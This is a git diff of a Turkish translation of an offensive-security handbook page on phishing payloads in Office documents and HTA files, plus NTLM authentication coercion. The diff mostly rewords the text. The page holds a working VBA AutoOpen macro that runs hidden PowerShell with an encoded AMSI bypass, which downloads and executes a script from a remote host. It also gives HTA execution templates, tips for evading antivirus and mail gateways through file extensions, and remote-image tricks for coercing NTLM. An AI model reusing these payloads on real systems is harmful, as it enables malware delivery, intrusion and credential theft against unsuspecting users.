@@ -2,49 +2,47 @@
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
+* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
+* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin**.
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaşın**.
 
 </details>
 
 ## Ofis Belgeleri
 
-Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlama şeklinde gerçekleştirilir. Veri yapısı tanımlama sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmaz.
+Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, incelenen dosya açılmaz.
 
-Genellikle makrolar içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyanın adını değiştirmek ve hala makro yürütme yeteneklerini korumak mümkündür.\
-Örneğin, RTF dosyası, tasarım gereği makroları desteklemez, ancak RTF olarak adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenecek ve makro yürütme yeteneklerine sahip olacaktır.\
-Aynı iç yapı ve mekanizmalar, Microsoft Office Suite'in diğer yazılımlarında da geçerlidir (Excel, PowerPoint vb.).
+Genellikle, makrolar içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırarak makro yürütme yeteneklerini korumak mümkündür.\
+Örneğin, RTF dosyası, tasarım gereği makroları desteklemez, ancak RTF olarak yeniden adlandırılmış bir DOCM dosyası, Microsoft Word tarafından işlenecek ve makro yürütme yeteneğine sahip olacaktır.\
+Aynı iç yapı ve mekanizmalar, Microsoft Office Suite'in tüm yazılımlarına (Excel, PowerPoint vb.) uygulanır.
 
-Aşağıdaki komutu kullanarak, bazı Office programları tarafından yürütülecek uzantıları kontrol edebilirsiniz:
+Bazı Ofis programları tarafından yürütülecek uzantıları kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX dosyaları, makrolar içeren uzaktan bir şablona (Dosya - Seçenekler - Eklentiler - Yönet: Şablonlar - Git) referans vererek makroları "çalıştırabilir".
-
-### Harici Resim Yükleme
+### Harici Görüntü Yükleme
 
 Git: _Ekle --> Hızlı Parçalar --> Alan_\
-_**Kategoriler**: Bağlantılar ve Referanslar, **Alan Adları**: includePicture ve **Dosya Adı veya URL**:_ http://\<ip>/herhangi_birşey
+_**Kategoriler**: Bağlantılar ve Referanslar, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://\<ip>/nebilirim
 
-![](<../../.gitbook/assets/image (316).png>)
+![](<../../.gitbook/assets/image (152).png>)
 
-### Makrolar Arka Kapı
+### Macros Arka Kapı
 
-Belgeden keyfi kod çalıştırmak için makroları kullanmak mümkündür.
+Makroların belgeden keyfi kod çalıştırmak için kullanılması mümkündür.
 
-#### Otomatik Yükleme Fonksiyonları
+#### Otomatik Yükleme işlevleri
 
-Ne kadar yaygın olurlarsa, AV tarafından tespit edilme olasılıkları o kadar yüksek olur.
+Daha yaygın oldukları takdirde, AV'nin onları tespit etme olasılığı daha yüksektir.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Makro Kodu Örnekleri
+#### Makrolar Kod Örnekleri
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -74,14 +72,14 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Meta verileri manuel olarak kaldırma
+#### Meta verilerini manuel olarak kaldırma
 
-**Dosya > Bilgi > Belgeyi İncele > Belgeyi İncele** yolunu izleyin, bu Belge Denetleyicisini açacaktır. **İncele**'ye tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgiler** yanındaki **Tümünü Kaldır**'a tıklayın.
+**Dosya > Bilgi > Belgeyi İncele > Belgeyi İncele**'ye gidin, bu Belge Denetleyicisini açacaktır. **İncele**'ye tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgiler** yanındaki **Tümünü Kaldır**'a tıklayın.
 
-#### Doc Uzantısı
+#### Belge Uzantısı
 
-Tamamlandığında, **Farklı Kaydet** açılır menüsünden **.docx** formatını **Word 97-2003 `.doc`** olarak değiştirin.\
-Bunu yapmanızın nedeni, **makroları `.docx` içine kaydedememeniz** ve makro destekli **`.docm`** uzantısının bir **stigmaya** sahip olmasıdır (örneğin, küçük resim simgesinde büyük bir `!` işareti bulunur ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.
+Tamamlandığında, **Farklı Kaydet** açılır menüsünden, formatı **`.docx`** yerine **Word 97-2003 `.doc`** olarak değiştirin.\
+Bunu yapın çünkü **makroları `.docx` içine kaydedemezsiniz** ve makro destekli **`.docm`** uzantısı etrafında bir **önyargı** var (örneğin, küçük resim simgesinde büyük bir `!` işareti bulunur ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.
 
 #### Zararlı Makro Oluşturucuları
 
@@ -91,9 +89,9 @@ Bunu yapmanızın nedeni, **makroları `.docx` içine kaydedememeniz** ve makro 
 
 ## HTA Dosyaları
 
-Bir HTA, HTML ve VBScript ve JScript gibi betik dillerini birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tamamen güvenilir" bir uygulama olarak çalışır.
+Bir HTA, HTML ve VBScript ve JScript gibi betik dillerini **birleştiren bir Windows programıdır**. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tamamen güvenilir" bir uygulama olarak çalıştırılır.
 
-Bir HTA, genellikle **Internet Explorer** ile birlikte **kurulan** **`mshta.exe`** kullanılarak çalıştırılır, bu nedenle **`mshta` IE'ye bağımlıdır**. Bu nedenle, IE kaldırıldıysa, HTA'lar çalıştırılamaz.
+Bir HTA, genellikle **Internet Explorer ile birlikte yüklenen** **`mshta.exe`** kullanılarak çalıştırılır, bu da **`mshta`'nın IE'ye bağlı** olduğu anlamına gelir. Bu nedenle, IE kaldırılmışsa, HTA'lar çalışamaz.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -148,9 +146,9 @@ var_func
 self.close
 </script>
 ```
-## NTLM Kimlik Doğrulamasını Zorlama
+## NTLM Kimlik Doğrulamasını Zorlamak
 
-**NTLM kimlik doğrulamasını "uzaktan" zorlamak için** birkaç yol vardır, örneğin, kullanıcıya erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM ile?). Veya kurbanı, yalnızca **klasörü açmak için** bir **kimlik doğrulaması tetikleyecek** dosyaların adresini gönderebilirsiniz.
+**NTLM kimlik doğrulamasını "uzaktan" zorlamak** için birkaç yol bulunmaktadır, örneğin, kullanıcı erişeceği e-postalara veya HTML'ye **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbanı, sadece **klasörü açmak için kimlik doğrulamasını tetikleyecek dosyaların adresini** gönderebilirsiniz.
 
 **Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda kontrol edin:**
 
@@ -164,19 +162,7 @@ self.close
 
 ### NTLM Aktarımı
 
-Unutmayın, sadece hash'i veya kimlik doğrulamasını çalmakla kalmaz, aynı zamanda **NTLM aktarım saldırıları** da gerçekleştirebilirsiniz:
+Unutmayın, sadece hash'i veya kimlik doğrulamayı çalmakla kalmayıp aynı zamanda **NTLM aktarım saldırıları da gerçekleştirebilirsiniz**:
 
 * [**NTLM Aktarım Saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (Sertifikalara NTLM aktarımı)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
-
-<details>
-
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>
-
-* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
-* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
-
-</details>
+* [**AD CS ESC8 (NTLM aktarımı sertifikalara)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
